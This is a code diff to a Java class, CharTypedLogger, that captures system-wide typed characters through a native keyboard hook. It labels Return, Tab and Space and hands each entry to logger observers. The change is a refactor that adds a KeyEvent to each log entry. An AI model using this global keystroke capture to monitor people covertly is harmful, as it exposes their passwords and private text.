@@ -62,22 +62,22 @@ public final class CharTypedLogger extends AbstractDataLogger implements NativeK
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent event) {
 
-		StringBuilder logMsg = new StringBuilder();
-
-		char ch = event.getKeyChar();
+		KeyEvent keyEvent = new KeyEvent(KeyEvent.Type.RELEASED, event.getKeyCode(), event.getKeyChar());
+		String logMsg;
 
 		// add spacing if not alphanumeric char
+		char ch = event.getKeyChar();
 		if (ch == '\n' || ch == '\r') {
-			logMsg.append("[Return]");
+			logMsg = "[Return]";
 		} else if (ch == '\t') {
-			logMsg.append("[Tab]");
+			logMsg = "[Tab]";
 		} else if (ch == ' ') {
-			logMsg.append("[Space]");
+			logMsg = "[Space]";
 		} else {
-			logMsg.append(ch);
+			logMsg = Character.toString(ch);
 		}
 
-		LogEntry logEntry = new LogEntry(logMsg.toString());
+		LogEntry logEntry = new LogEntry(logMsg, keyEvent);
 		notifyDataLoggerObservers(this, logEntry);
 
 	}
